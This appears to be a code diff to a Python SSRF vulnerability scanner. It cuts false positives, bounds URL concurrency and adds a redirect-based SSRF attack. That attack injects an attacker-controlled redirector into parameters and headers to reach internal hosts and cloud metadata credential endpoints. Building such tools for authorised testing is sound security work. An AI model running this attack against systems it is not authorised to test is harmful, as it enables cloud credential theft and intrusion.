@@ -108,6 +108,10 @@ class SSRFScanner:
         self.oob_listen = '0.0.0.0:8000'
         self.oob_domain = ''           # public authority with wildcard DNS
         self.oob_wait = 8              # seconds to wait for late callbacks
+
+        # How many URLs to scan concurrently (each runs all phases). Bounded to
+        # keep memory sane on large --file lists.
+        self.url_concurrency = 5
         
         # Request tracking
         self.total_requests_attempted = 0
@@ -232,12 +236,16 @@ class SSRFScanner:
                     if len(auth_parts) == 2:
                         request_kwargs['proxy_auth'] = aiohttp.BasicAuth(auth_parts[0], auth_parts[1])
 
-            self.total_requests_attempted += 1
-            
             async with self.semaphore:
                 # Rate limiting: block until a token is available so we honor
                 # the configured --rate-limit (and adaptive backoff on errors).
                 await self.throttler.pre_request()
+
+                # Count the attempt at dispatch time (after the semaphore + rate
+                # limiter), not when the coroutine starts - otherwise every
+                # queued coroutine inflates the counter up front and the
+                # progress %/req-rate become meaningless.
+                self.total_requests_attempted += 1
 
                 request_start = time.perf_counter()
                 async with self.request_manager.session.request(**request_kwargs) as response:
@@ -330,40 +338,62 @@ class SSRFScanner:
                 return indicator.decode('utf-8', errors='ignore')
         return None
 
+    @staticmethod
+    def _is_client_rejection(status_code: int) -> bool:
+        """True for 4xx codes (incl. 429). These mean the request was refused/
+        forbidden/malformed - the server did NOT perform an internal fetch - so
+        on their own they are not an SSRF signal."""
+        return 400 <= status_code < 500
+
     def analyze_response(self, original_response, test_response):
         """Analyze differences between original and test responses with smart detection"""
         if not test_response:
             return False, {}
 
-        # Don't flag rate limiting as vulnerability
-        if test_response.status_code == 429:
+        status = test_response.status_code
+
+        # A concrete content signature (leaked creds / /etc/passwd / metadata)
+        # is a definite hit regardless of the status code.
+        signature = self._ssrf_signature(test_response)
+
+        # Client-side rejections (all 4xx, including 429 rate limiting) mean the
+        # payload was refused/forbidden/malformed - not that an internal fetch
+        # succeeded. Without a content signature these are NOT vulnerabilities.
+        # This is what a WAF/server returns for weird payloads (e.g. 400 for a
+        # malformed Host) and was the source of false positives.
+        if self._is_client_rejection(status):
+            if signature:
+                return True, {'ssrf_indicator': signature, 'test_status': status}
             return False, {}
 
         # Basic differences
         differences = {
-            'status_code_changed': original_response.status_code != test_response.status_code,
+            'status_code_changed': original_response.status_code != status,
             'content_length': len(original_response.content) != len(test_response.content),
-            'content_type': original_response.headers.get('content-type') != 
+            'content_type': original_response.headers.get('content-type') !=
                           test_response.headers.get('content-type'),
-            'word_count': len(original_response.text.split()) != 
+            'word_count': len(original_response.text.split()) !=
                          len(test_response.text.split())
         }
-        
+
+        if signature:
+            differences['ssrf_indicator'] = signature
+            return True, differences  # Definite hit
+
         # Use baseline if available for smarter detection
         if hasattr(self, 'baseline') and self.baseline:
-            # Check if status code differs from baseline (HIGH PRIORITY)
-            # But ignore rate limiting
-            if test_response.status_code not in self.baseline['status_codes'] and test_response.status_code != 429:
+            # Status differs from baseline and is a non-4xx (2xx/3xx/5xx) code -
+            # a genuinely interesting change (fetch succeeded / redirected /
+            # backend errored).
+            if status not in self.baseline['status_codes']:
                 differences['unexpected_status'] = True
                 differences['baseline_status'] = list(self.baseline['status_codes'])
-                differences['test_status'] = test_response.status_code
-                # Status code change is always significant
+                differences['test_status'] = status
                 return True, differences
-            
-            # If baseline is stable and response differs significantly, it's interesting
+
+            # If baseline is stable and response differs significantly in size
             if self.baseline['stable']:
                 length_diff = abs(len(test_response.content) - self.baseline['avg_length'])
-                # Flag if difference is > 10% of baseline
                 if length_diff > self.baseline['avg_length'] * 0.1:
                     differences['significant_size_change'] = True
                     differences['size_diff_percent'] = (length_diff / self.baseline['avg_length']) * 100
@@ -372,26 +402,18 @@ class SSRFScanner:
             if differences['status_code_changed']:
                 differences['unexpected_status'] = True
                 differences['baseline_status'] = [original_response.status_code]
-                differences['test_status'] = test_response.status_code
+                differences['test_status'] = status
                 return True, differences
-        
-        # Look for anchored SSRF content signatures (shared class constant).
-        signature = self._ssrf_signature(test_response)
-        if signature:
-            differences['ssrf_indicator'] = signature
-            return True, differences  # Definite hit
-        
-        # Flag if we have significant differences
-        significant_diffs = ['status_code_changed', 'significant_size_change', 'unexpected_status', 'ssrf_indicator']
+
+        # Flag only on genuinely significant, non-rejection differences.
+        significant_diffs = ['significant_size_change', 'unexpected_status', 'ssrf_indicator']
         has_significant = any(differences.get(k, False) for k in significant_diffs)
-        
-        # Additional check: if status code matches baseline and no SSRF indicators, not vulnerable
+
+        # If status matches baseline and there is no signature, not vulnerable.
         if hasattr(self, 'baseline') and self.baseline:
-            if (test_response.status_code in self.baseline['status_codes'] and 
-                'ssrf_indicator' not in differences):
-                # Status matches baseline and no suspicious content - likely not vulnerable
+            if status in self.baseline['status_codes'] and 'ssrf_indicator' not in differences:
                 return False, differences
-        
+
         return has_significant, differences
 
     def _estimate_requests_per_url(self) -> int:
@@ -420,6 +442,8 @@ class SSRFScanner:
             est += 16 if not self._has_callback_target() else self.blind_lib.count()
         if self._has_callback_target():                      # Remote
             est += h * 10
+        if self._oob_enabled():                              # Redirect (OOB only)
+            est += 5 * 4 * (5 + h)                           # targets x codes x (params + headers)
         return max(est, 1)
 
     def print_progress(self):
@@ -488,7 +512,7 @@ class SSRFScanner:
 
             if is_vulnerable:
                 result.verification_method = self.verify_vulnerability(url, payload, response, original_response)
-                self.reporter.add_result(result)
+                await self.reporter.add_result_async(result)
 
             return result
 
@@ -789,7 +813,7 @@ class SSRFScanner:
                 # Log + report
                 self.log_vulnerability(result)
                 if self.reporter:
-                    self.reporter.add_result(result)
+                    await self.reporter.add_result_async(result)
 
     async def portScanAttack(self, url, original_response):
         """Perform SSRF port scan attack"""
@@ -1061,7 +1085,80 @@ class SSRFScanner:
                 )
                 self.log_vulnerability(result)
                 if self.reporter:
-                    self.reporter.add_result(result)
+                    await self.reporter.add_result_async(result)
+
+    async def redirectAttack(self, url, original_response):
+        """Redirect-based SSRF: point the target at an OOB URL that 30x-redirects
+        to an internal host.
+
+        Many SSRF filters validate only the initial URL; if the fetcher follows
+        redirects, a 30x to an internal target bypasses them. The OOB listener
+        serves the redirect and records the fetch, so a callback here confirms
+        the target fetched a user-controlled URL (reported in _finalize_oob).
+        Requires an active OOB listener (--oob-mode selfhosted).
+        """
+        if not self._oob_enabled():
+            return
+
+        internal_targets = [
+            'http://169.254.169.254/latest/meta-data/',
+            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+            'http://metadata.google.internal/computeMetadata/v1/',
+            'http://127.0.0.1/',
+            'http://[::1]/',
+        ]
+        codes = [301, 302, 307, 308]
+        param_names = ['url', 'redirect', 'dest', 'next', 'u']
+
+        tasks = []
+        meta = []  # (vector, request_url, target, code)
+        for target in internal_targets:
+            for code in codes:
+                redirector = self.oob.new_redirect('Redirect', f'{code} -> {target}', url, target, code)
+                # (a) inject the redirector as a fetched parameter value
+                sep = '&' if '?' in url else '?'
+                for pname in param_names:
+                    test_url = f"{url}{sep}{pname}={quote(redirector, safe='')}"
+                    tasks.append(self.make_request(test_url))
+                    meta.append((f'param:{pname}', test_url, target, code))
+                # (b) inject the redirector as a header value
+                for header in self.headers:
+                    tasks.append(self.make_request(url, headers={header: redirector}))
+                    meta.append((f'header:{header}', url, target, code))
+
+        if not tasks:
+            return
+
+        total_tests = len(tasks)
+        completed_tests = 0
+        responses = await asyncio.gather(*tasks, return_exceptions=True)
+
+        for (vector, request_url, target, code), response in zip(meta, responses):
+            completed_tests += 1
+            if completed_tests % 50 == 0:
+                self.update_progress('Redirect', completed_tests, total_tests)
+
+            if not response or isinstance(response, Exception):
+                continue
+            # In-band signal: the target followed the redirect and returned the
+            # internal body. (Out-of-band confirmation is handled separately.)
+            signature = self._ssrf_signature(response)
+            if signature:
+                result = ScanResult(
+                    url=request_url,
+                    attack_type='Redirect',
+                    payload=f'{vector} {code} -> {target}',
+                    response_code=response.status_code,
+                    response_size=len(response.content),
+                    timestamp=datetime.now(),
+                    headers={},
+                    is_vulnerable=True,
+                    verification_method="Response Content Analysis",
+                    notes=f"content signature via redirect: {signature}"
+                )
+                self.log_vulnerability(result)
+                if self.reporter:
+                    await self.reporter.add_result_async(result)
 
     def verify_vulnerability(self, url: str, payload: str, response, original_response=None) -> str:
         """Verify if the potential vulnerability is real"""
@@ -1253,6 +1350,14 @@ class SSRFScanner:
                 await self.blindSsrfAttack(url, original_response)
             except Exception as e:
                 self.logger.error(f"Error in Blind SSRF attack: {str(e)}")
+
+            # Redirect-based SSRF only runs with an active OOB listener.
+            if self._oob_enabled():
+                try:
+                    self.progress.current_phase = "Redirect"
+                    await self.redirectAttack(url, original_response)
+                except Exception as e:
+                    self.logger.error(f"Error in Redirect attack: {str(e)}")
             
             # Run remote attack when a callback destination exists (OOB or --backurl)
             if self._has_callback_target():
@@ -1410,7 +1515,7 @@ class SSRFScanner:
             )
             self.log_vulnerability(result)
             if self.reporter:
-                self.reporter.add_result(result)
+                await self.reporter.add_result_async(result)
 
         if not self.quiet_mode:
             if confirmed:
@@ -1467,6 +1572,8 @@ class SSRFScanner:
             _conc = self.config.scanner['concurrency']
             _lph = self.config.scanner.get('limit_per_host', 0) or _conc
             print(f"    Concurrency: {_conc} (per-host: {_lph})")
+            if self.nrTotUrls > 1:
+                print(f"    URL Concurrency: {self.url_concurrency}")
             print(f"    Rate Limit: {self.config.rate_limiting['requests_per_second']} req/s")
             print(f"    Timeout: {self.config.scanner['timeout']}s")
             print(f"    Output Format: {self.config.output['format']}")
@@ -1481,8 +1588,18 @@ class SSRFScanner:
         self.scan_start_time = time.time()
         
         try:
-            # Process all URLs concurrently
-            tasks = [self.scan_url(url) for url in url_list]
+            # Bound how many URLs are scanned at once. Each URL runs all phases
+            # and builds large task lists, so scanning a big -f list fully
+            # concurrently would multiply memory by the number of URLs. A
+            # semaphore caps in-flight URLs while per-request concurrency is
+            # still governed by self.semaphore.
+            url_sem = asyncio.Semaphore(max(1, self.url_concurrency))
+
+            async def _bounded_scan(u):
+                async with url_sem:
+                    await self.scan_url(u)
+
+            tasks = [_bounded_scan(url) for url in url_list]
             await asyncio.gather(*tasks, return_exceptions=True)
 
             # Wait for (and collect) any out-of-band callbacks, then report them.
